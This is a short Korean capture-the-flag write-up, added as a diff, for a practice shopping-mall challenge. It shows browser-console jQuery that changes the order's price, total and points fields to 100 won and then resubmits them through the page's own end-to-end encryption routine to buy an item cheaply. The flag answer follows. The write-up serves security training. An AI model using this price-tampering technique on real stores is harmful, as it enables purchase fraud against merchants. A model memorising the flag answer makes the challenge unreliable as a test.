@@ -1,0 +1,28 @@
+========================
+쇼핑몰 11번
+========================
+
+1. 공격 과정
+   1) 주문 요청에서 일반 가격 파라미터 대신 e2edata 값 하나로 주문정보가 암호화되어 전송되는 것을 확인
+   2) practice11.js에서 주문 폼 전체를 getFormData()로 가져온 뒤 AES 암호화하여 e2edata로 전송하는 로직 확인
+   3) 주문 페이지 Console에서 가격 관련 값을 직접 100원으로 변경
+	$('input[name="price2"]').val('100');	
+	$('input[name="totalprice"]').val('100');
+	$('input[name="pointsave"]').val('3');
+	var param = getFormData();
+	e2edatasend(param);
+	
+   4) getFormData()로 변경된 주문정보를 다시 수집
+   5) e2edatasend()를 호출하여 변경된 값을 정상 E2E 암호화 방식으로 서버에 전송
+   6) 100원으로 상품 구매 후 구매확정하여 Flag 획득
+
+2. 공격 구문
+   $('input[name="price2"]').val('100');
+   $('input[name="totalprice"]').val('100');
+   $('input[name="pointsave"]').val('3');
+   var param = getFormData();
+   e2edatasend(param);
+
+3. 정답
+   end_to_end_encryption
+========================
